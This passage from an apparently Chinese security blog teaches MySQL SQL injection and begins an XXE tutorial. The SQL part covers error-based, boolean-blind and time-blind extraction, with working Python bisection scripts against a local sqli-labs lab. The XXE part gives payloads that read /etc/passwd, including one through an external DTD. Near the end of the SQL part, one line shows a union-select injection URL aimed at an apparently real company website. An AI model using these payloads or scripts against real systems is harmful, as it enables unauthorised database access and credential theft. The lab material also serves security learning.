<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users group by username;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>length()  返回字符串的长度</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select length(&apos;www.baidu.com&apos;);</div><div class="line">+-------------------------+</div><div class="line">| length(&apos;www.baidu.com&apos;) |</div><div class="line">+-------------------------+</div><div class="line">|                      13 |</div><div class="line">+-------------------------+</div><div class="line">mysql&gt; select * from users where length(username) &lt;6;</div><div class="line">+----+----------+----------+</div><div class="line">| id | username | password |</div><div class="line">+----+----------+----------+</div><div class="line">|  1 | Dumb     | Dumb     |</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line">|  8 | admin    | admin    |</div><div class="line">+----+----------+----------+</div></pre></td></tr></table></figure>
<blockquote>
<p>Substr()  截取字符串  三个参数  （所要截取字符串，截取的位置，截取的长度）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr(&apos;123456&apos;,2,3);</div><div class="line">+----------------------+</div><div class="line">| substr(&apos;123456&apos;,2,3) |</div><div class="line">+----------------------+</div><div class="line">| 234                  |</div><div class="line">+----------------------+</div><div class="line">mysql&gt; select substr(username,2,3) from users ;</div><div class="line">+----------------------+</div><div class="line">| substr(username,2,3) |</div><div class="line">+----------------------+</div><div class="line">| umb                  |</div><div class="line">| nge                  |</div><div class="line">| umm                  |</div><div class="line">| ecu                  |</div><div class="line">| tup                  |</div><div class="line">| upe                  |</div><div class="line">| atm                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| hak                  |</div><div class="line">| dmi                  |</div><div class="line">+----------------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>Ascii()   返回字符串的ascii码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(2);</div><div class="line">+----------+</div><div class="line">| ascii(2) |</div><div class="line">+----------+</div><div class="line">|       50 |</div><div class="line">+----------+</div><div class="line">mysql&gt; select ascii(substr(username,2,1)) from users;</div><div class="line">+-----------------------------+</div><div class="line">| ascii(substr(username,2,1)) |</div><div class="line">+-----------------------------+</div><div class="line">|                         117 |</div><div class="line">|                         110 |</div><div class="line">|                         117 |</div><div class="line">|                         101 |</div><div class="line">|                         116 |</div><div class="line">|                         117 |</div><div class="line">|                          97 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         104 |</div><div class="line">|                         100 |</div><div class="line">+-----------------------------+</div></pre></td></tr></table></figure>
<h3 id="0x03-基于报错注入"><a href="#0x03-基于报错注入" class="headerlink" title="0x03 基于报错注入"></a>0x03 基于报错注入</h3><p>常用floor，UpdateXml(有长度限制,最长32位)，ExtractValue(有长度限制,最长32位)</p>
<blockquote>
<p>floor报错</p>
</blockquote>
<ul>
<li><p>获取数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),(concat(0x3a,database(),0x3a,floor(rand()*2))) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       58 | :security:0 |</div><div class="line">|       47 | :security:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-----------+</div><div class="line">| count(*) | name      |</div><div class="line">+----------+-----------+</div><div class="line">|       44 | ::users:0 |</div><div class="line">|       61 | ::users:1 |</div><div class="line">+----------+-----------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取字段名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       51 | ::user_id:0 |</div><div class="line">|       54 | ::user_id:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+----------+</div><div class="line">| count(*) | name     |</div><div class="line">+----------+----------+</div><div class="line">|       46 | ::Dumb:0 |</div><div class="line">|       59 | ::Dumb:1 |</div><div class="line">+----------+----------+</div></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>UpdateXml报错</p>
</blockquote>
<ul>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~users&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>获取字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 4,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~password&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~user&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 0,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~Dumb&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 1,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~I-kill-you&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>extractvalue报错</p>
</blockquote>
<ul>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\users&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>获取字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 1,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\I-kill-you&apos;</div><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 0,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\Dumb&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x04-基于布尔盲注"><a href="#0x04-基于布尔盲注" class="headerlink" title="0x04 基于布尔盲注"></a>0x04 基于布尔盲注</h3><ul>
<li><p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 0,1;</div><div class="line">+------------+</div><div class="line">| table_name |</div><div class="line">+------------+</div><div class="line">| emails     |</div><div class="line">+------------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取表名第一个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| e    |</div><div class="line">+------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取表名第一个字符的ASCII</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|  101 |</div><div class="line">+------+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>获取字段名与字段内容原理一样。</p>
<p>以Sqli-labs Less8为例，无论输入什么就只有正确和错误，于是可以判断基于布尔的盲注。</p>
<ul>
<li>先判断当前数据库的长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and length(database())&gt;8 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>发现当值为8的时候，页面就没有显示。那么说明database()的长度是8</p>
<ul>
<li>获取数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding:utf-8 -*-</div><div class="line">import requests</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">        #print low, mid, high</div><div class="line">        payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div><div class="line">        url = payload.format(pos,mid)</div><div class="line">        req = requests.get(url)</div><div class="line">        length = len(req.text)</div><div class="line">        if length == 706:  ##返回的长度只有706和722</div><div class="line">            low = mid+1</div><div class="line">        else:</div><div class="line">            high = mid</div><div class="line">        mid = (high+low)&gt;&gt;1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
<ul>
<li>获取表长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0 %23</div></pre></td></tr></table></figure>
</li>
</ul>
<p>发现当值为6的时候，页面就没有显示。那么说明表的长度是6</p>
<ul>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">和上面类似，只需要把payload修改为下面即可：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23</div></pre></td></tr></table></figure>
</li>
<li><p>获取列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select username from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x05-基于时间盲注"><a href="#0x05-基于时间盲注" class="headerlink" title="0x05 基于时间盲注"></a>0x05 基于时间盲注</h3><p>If(expr1,expr2,expr3)    判断语句<br>if(database()=’security’,1,2) 判断数据库名是否为security，正确返回1，错误返回2。基于时间的注入和基于布尔差不多，引入了if语句进行判断。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| NULL |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|    0 |</div><div class="line">+------+</div><div class="line">1 row in set (5.00 sec)</div></pre></td></tr></table></figure>
<p>以Sqli-labs Less8为例，无论我们怎么输入，输出结果都是You are in ，所以判断为基于时间的盲注。</p>
<ul>
<li><p>数据库长度判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(length(database())&gt;9,0,sleep(5)) --+</div></pre></td></tr></table></figure>
</li>
<li><p>使用二分法获得数据库名</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding: utf-8 -*-</div><div class="line">import requests</div><div class="line">import time</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">                startTime=time.time()</div><div class="line">                payload = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">                url = payload.format(pos,mid)</div><div class="line">                response=requests.get(url)    #发送请求</div><div class="line">                if time.time() - startTime &lt; 5:    #判断是否延时了5秒</div><div class="line">                    low = mid + 1</div><div class="line">                else:</div><div class="line">                    high = mid</div><div class="line">                mid = (high + low) &gt;&gt; 1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
<p>剩余步骤和基于布尔的差不多，只是加了一个if判断语句进行判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">获取表名：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23</div><div class="line">获取列名：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">获取内容：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div></pre></td></tr></table></figure></p>
<p>1,column_name from information_schema.columns where table_schema = database() and table_name = 0x6d63795f61646d696e</p>
<p><a href="http://www.innogreen.com.hk/VerticalGreening.php?id=-22" target="_blank" rel="external">http://www.innogreen.com.hk/VerticalGreening.php?id=-22</a> union select 1,group_concat(column_name) from information_schema.columns where  table_name = 0x6d63795f61646d696e #</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-SQL注入&quot;&gt;&lt;a href=&quot;#0x01-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 SQL注入&quot;&gt;&lt;/a&gt;0x01 SQL注入&lt;/h3&gt;&lt;p&gt;1、连接符:mysql 空格，Oracle ||,sql server +&lt;br&gt;2、黑魔法${IFS}，Linux下可以使用其代替空格&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="https://zjw.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="https://zjw.dropsec.xyz/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="sql注入" scheme="https://zjw.dropsec.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞攻防</title>
    <link href="https://zjw.dropsec.xyz/%E6%BC%8F%E6%B4%9E/2017/06/30/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2.html"/>
    <id>https://zjw.dropsec.xyz/漏洞/2017/06/30/XXE漏洞攻防.html</id>
    <published>2017-06-30T02:30:55.000Z</published>
    <updated>2017-07-01T13:31:30.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-XXE"><a href="#0x01-XXE" class="headerlink" title="0x01 XXE"></a>0x01 XXE</h3><p>　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
<h3 id="0x02-XML"><a href="#0x02-XML" class="headerlink" title="0x02 XML"></a>0x02 XML</h3><p>　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!--XML申明--&gt;</div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;   </div><div class="line">&lt;!--文档类型定义--&gt;</div><div class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</div><div class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">  &lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</div><div class="line">]&gt;</div><div class="line">&lt;!--文档元素--&gt;</div><div class="line">&lt;note&gt;</div><div class="line">&lt;to&gt;Dave&lt;/to&gt;</div><div class="line">&lt;from&gt;Tom&lt;/from&gt;</div><div class="line">&lt;head&gt;Reminder&lt;/head&gt;</div><div class="line">&lt;body&gt;You are a good man&lt;/body&gt;</div><div class="line">&lt;/note&gt;</div></pre></td></tr></table></figure></p>
<p>　　DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<ul>
<li><p>内部声明DTD</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 [元素声明]</div></pre></td></tr></table></figure>
</li>
<li><p>引用外部DTD</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>　　DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值，可以内部声明或外部引用。实体按类型主要分为以下四种：</p>
<blockquote>
<p>内置实体 (Built-in entities)<br>字符实体 (Character entities)<br>通用实体 (General entities)<br>参数实体 (Parameter entities)</p>
</blockquote>
<ul>
<li><p>内部声明实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>引用外部实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>参数实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x03-XML外部实体注入"><a href="#0x03-XML外部实体注入" class="headerlink" title="0x03 XML外部实体注入"></a>0x03 XML外部实体注入</h3><p>　　当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<ul>
<li><p>恶意引用外部实体方式1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>恶意引用外部实体方式2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY % b SYSTEM &quot;http://zjw.dropsec.xyz/1.dtd&quot;&gt;</div><div class="line">  %b;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>DTD文件(1.dtd)内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure></p>
<ul>
<li>恶意引用外部实体方式3<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY a SYSTEM &quot;http://zjw.dropsec.xyz/1.dtd&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>DTD文件(1.dtd)内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>不同的程序支持不同的协议:<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/57454021.jpg" alt=""><br>另外PHP还支持一些扩展协议：<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/56162947.jpg" alt=""></p>
<blockquote>
